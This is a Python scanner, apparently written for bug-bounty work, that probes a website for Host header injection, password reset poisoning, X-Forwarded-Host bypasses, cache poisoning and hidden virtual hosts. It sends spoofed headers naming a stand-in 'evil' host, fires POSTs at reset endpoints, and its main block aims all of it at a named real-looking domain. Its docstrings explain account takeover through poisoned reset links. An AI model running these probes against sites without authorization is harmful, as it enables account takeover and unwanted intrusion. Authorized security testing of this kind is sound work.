import requests
import urllib3
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class HostHeaderTester:
    """
    SecureScope Host Header Injection Tester
    ==========================================
    Tests for Host header injection vulnerabilities.

    WHY HIGH VALUE IN BUG BOUNTY:
    Easy to find — most tools miss it!
    Password reset poisoning = account takeover
    = HIGH severity = good payout!

    WHAT IS HOST HEADER INJECTION:
    Website uses Host header to build URLs
    Example: Password reset email contains:
    "Click here: https://HOSTHEADER/reset?token=abc"

    If we change Host header to our domain:
    "Click here: https://attacker.com/reset?token=abc"
    Victim clicks → We get their reset token!
    = Complete account takeover!

    REAL INCIDENTS:
    - Used in thousands of account takeovers
    - Common in Laravel, Django, Rails apps
    - HackerOne pays $500-3000 for this!
    """

    def __init__(self, target_url):
        if not target_url.startswith("http"):
            target_url = "https://" + target_url
        self.target = target_url
        self.domain = urlparse(target_url).netloc
        self.session = requests.Session()
        self.session.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        self.findings = []
        print(f"Host Header Tester Ready! Target: {self.target}")

    # ============================================================
    # TEST 1 — Basic Host Header Injection
    # ============================================================
    def test_basic_injection(self):
        """
        Tests if server uses Host header in response.
        If attacker.com appears in response = vulnerable!
        """
        print("[*] Testing basic host header injection...")

        evil_host = "evil-securescope-test.com"

        try:
            resp = self.session.get(
                self.target,
                headers={"Host": evil_host},
                timeout=10,
                verify=False
            )

            # Check if evil host appears in response
            if evil_host in resp.text:
                self.findings.append({
                    "type": "Host Header Injection",
                    "detail": f"Server reflects Host header in response — injection possible!",
                    "severity": "HIGH",
                    "evidence": f"evil-securescope-test.com appeared in response body",
                    "url": self.target
                })
                print("[HIGH] Host header reflected in response!")

            # Check if redirected to evil host
            if resp.history:
                for r in resp.history:
                    location = r.headers.get("Location", "")
                    if evil_host in location:
                        self.findings.append({
                            "type": "Host Header Redirect Injection",
                            "detail": "Server redirects using attacker-controlled Host header!",
                            "severity": "CRITICAL",
                            "evidence": f"Redirected to: {location}",
                            "url": self.target
                        })
                        print("[CRITICAL] Host header redirect injection!")

        except Exception as e:
            print(f"[!] Basic injection test error: {e}")

    # ============================================================
    # TEST 2 — Password Reset Poisoning
    # ============================================================
    def test_password_reset_poisoning(self):
        """
        Tests if password reset emails use Host header.

        ATTACK SCENARIO:
        1. Attacker requests password reset for victim@gmail.com
        2. Attacker sets Host header to attacker.com
        3. Reset email sent to victim contains:
           "Click: https://attacker.com/reset?token=SECRET"
        4. Victim clicks → Attacker gets token!
        5. Attacker resets victim's password!
        = Complete account takeover!
        """
        print("[*] Testing password reset poisoning...")

        reset_endpoints = [
            "/forgot-password",
            "/forgot_password",
            "/reset-password",
            "/reset_password",
            "/auth/forgot-password",
            "/api/auth/forgot-password",
            "/api/forgot-password",
            "/password/reset",
            "/account/forgot-password",
            "/users/password/new",
        ]

        evil_host = "evil-securescope-test.com"

        for endpoint in reset_endpoints:
            url = f"{self.target.rstrip('/')}{endpoint}"
            try:
                # Test GET request with evil host
                resp = self.session.get(
                    url,
                    headers={
                        "Host": evil_host,
                        "X-Forwarded-Host": evil_host,
                        "X-Forwarded-For": evil_host,
                    },
                    timeout=5,
                    verify=False
                )

                if resp.status_code in [200, 302]:
                    # Check if evil host in response
                    if evil_host in resp.text or evil_host in str(resp.headers):
                        self.findings.append({
                            "type": "Password Reset Poisoning",
                            "detail": f"Password reset at {endpoint} uses Host header — poisoning possible!",
                            "severity": "CRITICAL",
                            "evidence": f"Host header reflected at {endpoint}",
                            "url": url
                        })
                        print(f"[CRITICAL] Password reset poisoning at {endpoint}!")

                # Test POST request
                post_resp = self.session.post(
                    url,
                    json={"email": "test@test.com"},
                    headers={
                        "Host": evil_host,
                        "X-Forwarded-Host": evil_host,
                    },
                    timeout=5,
                    verify=False
                )

                if post_resp.status_code in [200, 201, 202]:
                    if evil_host in post_resp.text:
                        self.findings.append({
                            "type": "Password Reset Poisoning",
                            "detail": f"POST to {endpoint} reflects Host header!",
                            "severity": "CRITICAL",
                            "evidence": f"evil host in POST response at {endpoint}",
                            "url": url
                        })
                        print(f"[CRITICAL] POST reset poisoning at {endpoint}!")

            except Exception:
                pass

    # ============================================================
    # TEST 3 — X-Forwarded-Host Injection
    # ============================================================
    def test_x_forwarded_host(self):
        """
        Tests X-Forwarded-Host header injection.

        WHY:
        Many servers trust X-Forwarded-Host
        Even when they properly validate Host!
        This bypasses Host header protections!

        Common in:
        - Nginx reverse proxy setups
        - Load balanced applications
        - Cloud deployments
        """
        print("[*] Testing X-Forwarded-Host injection...")

        evil_host = "evil-securescope-test.com"
        bypass_headers = [
            {"X-Forwarded-Host": evil_host},
            {"X-Host": evil_host},
            {"X-Forwarded-Server": evil_host},
            {"X-HTTP-Host-Override": evil_host},
            {"Forwarded": f"host={evil_host}"},
        ]

        for headers in bypass_headers:
            header_name = list(headers.keys())[0]
            try:
                resp = self.session.get(
                    self.target,
                    headers=headers,
                    timeout=5,
                    verify=False
                )

                if evil_host in resp.text:
                    self.findings.append({
                        "type": f"Host Header Injection via {header_name}",
                        "detail": f"Server uses {header_name} in response — injection possible!",
                        "severity": "HIGH",
                        "evidence": f"{header_name}: {evil_host} reflected in response",
                        "url": self.target
                    })
                    print(f"[HIGH] {header_name} injection works!")

            except Exception:
                pass

    # ============================================================
    # TEST 4 — Cache Poisoning via Host Header
    # ============================================================
    def test_cache_poisoning(self):
        """
        Tests if Host header can poison web cache.

        WHY CRITICAL:
        If cache stores response with evil host
        Every user who visits site gets poisoned response!
        = Mass XSS or redirect affecting ALL users!

        Cache-Control headers indicate caching!
        """
        print("[*] Testing cache poisoning via Host header...")

        evil_host = "evil-securescope-test.com"

        try:
            # Send request with evil host
            resp = self.session.get(
                self.target,
                headers={
                    "Host": self.domain,
                    "X-Forwarded-Host": evil_host,
                },
                timeout=10,
                verify=False
            )

            # Check if response is cacheable
            cache_control = resp.headers.get("Cache-Control", "")
            age = resp.headers.get("Age", "")
            x_cache = resp.headers.get("X-Cache", "")

            is_cacheable = (
                "no-store" not in cache_control and
                "no-cache" not in cache_control and
                (age or "HIT" in x_cache or "MISS" in x_cache)
            )

            if is_cacheable and evil_host in resp.text:
                self.findings.append({
                    "type": "Web Cache Poisoning via Host Header",
                    "detail": "Cacheable response reflects Host header — cache poisoning possible!",
                    "severity": "CRITICAL",
                    "evidence": f"Cache-Control: {cache_control} | X-Cache: {x_cache}",
                    "url": self.target
                })
                print("[CRITICAL] Cache poisoning via Host header!")

            elif is_cacheable:
                print(f"[*] Response is cacheable but Host header not reflected")

        except Exception as e:
            print(f"[!] Cache poisoning test error: {e}")

    # ============================================================
    # TEST 5 — Virtual Host Enumeration
    # ============================================================
    def test_vhost_enumeration(self):
        """
        Discovers hidden virtual hosts on same server.
        """
        print("[*] Testing virtual host enumeration...")

        vhost_candidates = [
            f"admin.{self.domain}",
            f"internal.{self.domain}",
            f"dev.{self.domain}",
            f"staging.{self.domain}",
            f"api.{self.domain}",
            f"backend.{self.domain}",
            f"manage.{self.domain}",
            f"portal.{self.domain}",
            f"intranet.{self.domain}",
            f"private.{self.domain}",
            "localhost",
            "127.0.0.1",
        ]

        # Get baseline response with real domain
        try:
            baseline = self.session.get(
                self.target, timeout=5, verify=False
            )
            baseline_length = len(baseline.text)
            baseline_first_500 = baseline.text[:500]
        except Exception:
            return

        # Get fake domain response — to detect soft 404
        try:
            fake_resp = self.session.get(
                self.target,
                headers={"Host": "fakexyz99999.com"},
                timeout=5, verify=False
            )
            fake_length = len(fake_resp.text)
            fake_first_500 = fake_resp.text[:500]
        except Exception:
            fake_length = 0
            fake_first_500 = ""

        for vhost in vhost_candidates:
            try:
                resp = self.session.get(
                    self.target,
                    headers={"Host": vhost},
                    timeout=5,
                    verify=False
                )

                resp_length = len(resp.text)
                resp_first_500 = resp.text[:500]

                # Must be different from BOTH baseline AND fake
                diff_from_baseline = abs(resp_length - baseline_length)
                diff_from_fake = abs(resp_length - fake_length)

                is_unique = (
                    diff_from_baseline > 1000 and
                    diff_from_fake > 1000 and
                    resp_first_500 != fake_first_500 and
                    resp.status_code not in [400, 404, 444]
                )

                if is_unique:
                    self.findings.append({
                        "type": "Virtual Host Discovered",
                        "detail": f"Hidden virtual host found: {vhost}",
                        "severity": "MEDIUM",
                        "evidence": f"Status: {resp.status_code} | Length diff from baseline: {diff_from_baseline} bytes",
                        "url": f"https://{vhost}"
                    })
                    print(f"[MEDIUM] Real virtual host: {vhost}")
                else:
                    print(f"[INFO] Filtered false positive: {vhost}")

            except Exception:
                pass

    # ============================================================
    # MAIN — Run complete host header tests
    # ============================================================
    def run_full_scan(self):
        print("\n" + "="*60)
        print("SecureScope Host Header Injection Tester")
        print("="*60)

        self.test_basic_injection()
        self.test_password_reset_poisoning()
        self.test_x_forwarded_host()
        self.test_cache_poisoning()
        self.test_vhost_enumeration()

        print("\n" + "="*60)
        print(f"Host Header Test Complete!")
        print(f"Total Findings: {len(self.findings)}")

        critical = sum(1 for f in self.findings if f["severity"] == "CRITICAL")
        high = sum(1 for f in self.findings if f["severity"] == "HIGH")
        medium = sum(1 for f in self.findings if f["severity"] == "MEDIUM")

        print(f"CRITICAL: {critical} | HIGH: {high} | MEDIUM: {medium}")
        print("="*60)

        return self.findings


if __name__ == "__main__":
    tester = HostHeaderTester("https://sharpener.tech")
    findings = tester.run_full_scan()

    print("\n--- DETAILED FINDINGS ---")
    for f in findings:
        print(f"\n[{f['severity']}] {f['type']}")
        print(f"  Detail  : {f['detail']}")
        print(f"  Evidence: {f.get('evidence', 'N/A')[:80]}")
        print(f"  URL     : {f['url'][:80]}")